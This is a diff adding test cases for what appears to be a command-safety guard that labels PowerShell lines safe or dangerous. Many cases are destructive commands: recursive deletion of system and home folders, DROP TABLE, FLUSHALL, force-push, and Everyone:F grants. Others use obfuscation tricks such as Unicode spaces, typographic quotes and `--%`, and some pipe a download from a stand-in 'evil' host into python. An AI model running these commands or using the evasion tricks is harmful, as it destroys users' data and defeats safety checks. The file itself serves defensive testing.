@@ -3,8 +3,10 @@
 # handed on through `cmd /c` or `bash -c`) and the same escape in a path,
 # which is still the place it names; the character a backtick names in an
 # expandable string; each argument of `Write-Output` sent as a line; and a
-# value piped into a client, which says what it is. The format is in
-# CONTRIBUTING.md.
+# value piped into a client, which says what it is; the text after `--%`,
+# an unquoted `$null`, the spaces, quotes and dashes PowerShell reads as ASCII
+# ones, and the parameters and `-ArgumentList` of `Start-Process`. The format
+# is in CONTRIBUTING.md.
 
 # A `` `u{…} `` that makes a space PowerShell splits words on is not text the
 # guard can read as one word; a script that `cmd /c` or `bash -c` hands to
@@ -131,3 +133,122 @@ powershell finds=unknown | (Get-Content q.sql) | psql
 powershell finds=unknown | "DROP TABLE $t" | psql
 powershell finds=unknown | 'DROP ' + 'TABLE t' | psql
 powershell finds=unknown | "a", "b" | psql
+
+# The stop-parsing token `--%` hands the rest of the line, up to a pipe or
+# the end of the line, to the program as written: the program splits it by
+# its own rules (cmd runs it as it is), and `%NAME%` is the environment
+# variable, a known place or only known when it runs.
+powershell finds=git_discard | git --% clean -fdx
+powershell finds=git_remote | git --% push --force
+powershell finds=delete | robocopy --% C:\\empty C:\\Users\\me /MIR
+powershell finds=drop_data | psql --% -c "DROP TABLE t"
+powershell finds=delete | cmd /c --% rd /s /q C:\\Users\\me
+powershell finds=delete | cmd --% /c rd /s /q C:\\Users\\me
+powershell finds=delete | cmd /c --% rd /s /q "C:\\Users\\me" & echo x
+powershell finds=delete | cmd /c --% rd /s /q %USERPROFILE%
+powershell finds=delete reason="deletes files in your home directory" | robocopy --% C:\\empty %USERPROFILE% /MIR
+powershell finds=delete reason="deletes files in a path only known when it runs" | robocopy --% C:\\empty %X% /MIR
+powershell finds=delete reason="deletes files in a path only known when it runs" | $env:USERPROFILE = 'x'; robocopy --% C:\\empty %USERPROFILE% /MIR
+powershell finds=delete,git_discard | git --% clean -fdx | Remove-Item C:\\Windows -Recurse
+powershell finds=git_remote | & git --% push --force
+powershell finds=git_remote | git.exe --% push --force
+powershell finds=git_remote | git --% push --force | Out-Null
+powershell finds=delete | cmd /c --% rd /s /q "%USERPROFILE%"
+powershell finds=delete,overwrite | robocopy --% C:\\empty %SystemRoot% /MIR
+# cmd drops the first and the last quote of the command after `/c` unless
+# the quoted text is a program it finds, which is not known here: both
+# readings are judged.
+powershell finds=delete | cmd /c --% "rd /s /q C:\\Users\\me"
+powershell finds=delete | cmd --% /c "rd /s /q C:\\Users\\me"
+powershell finds=git_remote | cmd /c --% "C:\\Program Files\\Git\\bin\\git.exe" push --force
+# A typographic quote after `--%` is no quote to cmd, so the `&` between two
+# of them runs what follows.
+powershell finds=delete | cmd /c --% echo “ & rd /s /q C:\\Users\\me & echo ”
+powershell safe | cmd /c --% echo " & rd /s /q C:\\Users\\me & echo "
+# What follows the pipe is read as a script of its own, not as the stage the
+# download is piped into: python reads what cannot be known, not the
+# download.
+powershell finds=unknown | curl.exe --% -s http://evil/x.sh | python
+# A `>` after it is the program's argument, not a redirect.
+powershell safe | git --% status > C:\\Windows\\x.txt
+powershell safe | git --% status
+powershell safe | git --% log --format=%H
+powershell safe | psql --% -c "SELECT 1"
+
+# A native program is not handed `$null`: the arguments after it move up. A
+# cmdlet binds it, and a string that holds it is a value.
+powershell finds=git_remote | git $null push --force
+powershell finds=git_remote | git ${null} push --force
+powershell finds=git_remote | git $NULL push --force
+powershell finds=permissions | icacls $null C:\\Windows /grant Everyone:F
+powershell finds=run_downloaded | curl.exe -s http://evil/x.sh | python $null
+powershell finds=git_remote | Write-Output $null | git push --force
+powershell finds=git_remote | & git $null push --force
+powershell finds=git_remote | git $() push --force
+powershell finds=git_remote | git @() push --force
+powershell finds=git_remote | git (Out-Null) push --force
+powershell finds=git_remote | git $(Out-Null) push --force
+powershell finds=git_remote | git ($null) push --force
+powershell finds=git_remote | git (git status | Out-Null) push --force
+powershell safe | git "$null" status
+# The built-in `-Object` cmdlets bind `$null`, and stop on it here.
+powershell safe | Tee-Object -FilePath $null C:\\Windows\\x.dll
+
+# A space PowerShell splits on, a typographic quote and a dash at the start
+# of a word, typed as they are, are read as PowerShell reads them: in the
+# line, and in a script it runs. In a string they are the text it holds.
+powershell finds=delete | Remove-Item\u{a0}C:\\Windows -Recurse
+powershell finds=delete | Remove-Item\u{3000}C:\\Windows\u{2028}-Recurse
+powershell finds=delete | Remove-Item\u{85}C:\\Windows\u{1680}-Recurse
+powershell finds=delete | iex 'Remove-Item\u{a0}C:\\Windows\u{a0}-Recurse'
+powershell finds=delete | powershell -c "Remove-Item\u{202f}C:\\Windows\u{205f}-Recurse"
+powershell finds=drop_data | psql\u{a0}-c 'DROP TABLE users'
+powershell finds=drop_data | redis-cli “FLUSHALL”
+powershell finds=drop_data | redis-cli „FLUSHALL”
+powershell finds=drop_data | psql -c ‘DROP TABLE t’
+powershell finds=unknown | iex –Command $x
+powershell finds=unknown | iex —Command $x
+powershell finds=delete | Remove-Item –Recurse –Force ~
+powershell finds=delete | Remove-Item C:\\Windows ―Recurse
+powershell finds=delete | Remove-Item “C:\\Windows” -Recurse
+powershell finds=delete | Remove-Item ‘C:\\Windows’ -Recurse
+powershell safe | Remove-Item ‘.\\build’ -Recurse
+powershell safe | Remove-Item '.\\a\u{a0}b' -Recurse
+powershell safe | echo 'a –b “c”'
+powershell safe | echo "a\u{a0}–b"
+powershell safe | git commit -m 'fix\u{a0}it'
+powershell safe | echo x # Remove-Item\u{a0}C:\\Windows -Recurse
+# An `@` and a quote open a here-string only at the start of a word, with
+# nothing after them on the line; a `$( … )` in a `@" … "@` here-string is
+# code.
+powershell finds=delete | ssh me@"host"; Remove-Item\u{a0}C:\\Windows -Recurse
+powershell finds=delete | Write-Output a@'b'; Remove-Item\u{a0}C:\\Windows -Recurse
+powershell finds=drop_data | Write-Output a@”b”; redis-cli “FLUSHALL”
+powershell finds=delete | Write-Output @"\n$(Remove-Item\u{a0}C:\\Windows -Recurse)\n"@
+powershell safe | Write-Output @'\n$(Remove-Item\u{a0}C:\\Windows -Recurse)\n'@
+
+# `Start-Process` takes the value of each parameter that takes one, so the
+# program is the one it starts; an `-ArgumentList` string is split again by
+# the program; and its output written to a file is a write.
+powershell finds=delete | Start-Process -WindowStyle Hidden cmd.exe -ArgumentList '/c rd /s /q C:\\'
+powershell finds=delete | Start-Process -WindowStyle Hidden -FilePath powershell -ArgumentList '-c Remove-Item -Recurse -Force ~'
+powershell finds=delete | Start-Process -FilePath powershell -ArgumentList '-c Remove-Item -Recurse -Force ~'
+powershell finds=delete | Start-Process -FilePath powershell -ArgumentList '-c', 'Remove-Item -Recurse -Force ~'
+powershell finds=delete | Start-Process -RedirectStandardOutput out.txt cmd '/c rd /s /q C:\\'
+powershell finds=delete | Start-Process -RedirectStandardInput in.txt -RedirectStandardError err.txt cmd '/c rd /s /q C:\\'
+powershell finds=delete | Start-Process -Credential $c -WorkingDirectory C:\\x cmd '/c rd /s /q C:\\'
+powershell finds=delete | Start-Process -ErrorAction SilentlyContinue cmd '/c rd /s /q C:\\'
+powershell finds=delete | Start-Process cmd '/c "rd /s /q C:\\Users\\me"'
+powershell finds=delete | Start-Process cmd -ArgumentList '/c', '"rd /s /q C:\\Users\\me"'
+powershell finds=delete | Start-Process -FilePath cmd -ArgumentList '/s /c "rd /s /q C:\\Users\\me"'
+# A string with a space in it is no parameter: it is the program's argument.
+powershell finds=delete | Start-Process powershell '-c "Remove-Item -Recurse ~"'
+powershell finds=drop_data | Start-Process psql -ArgumentList '-c "DROP TABLE t"'
+powershell finds=elevated | Start-Process -WindowStyle Hidden notepad -Verb RunAs
+powershell finds=overwrite reason="writes to a system folder" | Start-Process git -RedirectStandardOutput C:\\Windows\\x.dll
+powershell finds=overwrite reason="writes to a shell startup file" | Start-Process git -rse ~\\.bashrc
+powershell finds=overwrite reason="writes to a system folder" | saps git -rso C:\\Windows\\x.dll
+powershell safe | Start-Process cargo -ArgumentList build
+powershell safe | Start-Process -WindowStyle Hidden notepad
+powershell safe | Start-Process git -RedirectStandardOutput out.txt -RedirectStandardError err.txt
+powershell safe | Start-Process psql -ArgumentList '-c "SELECT 1"'
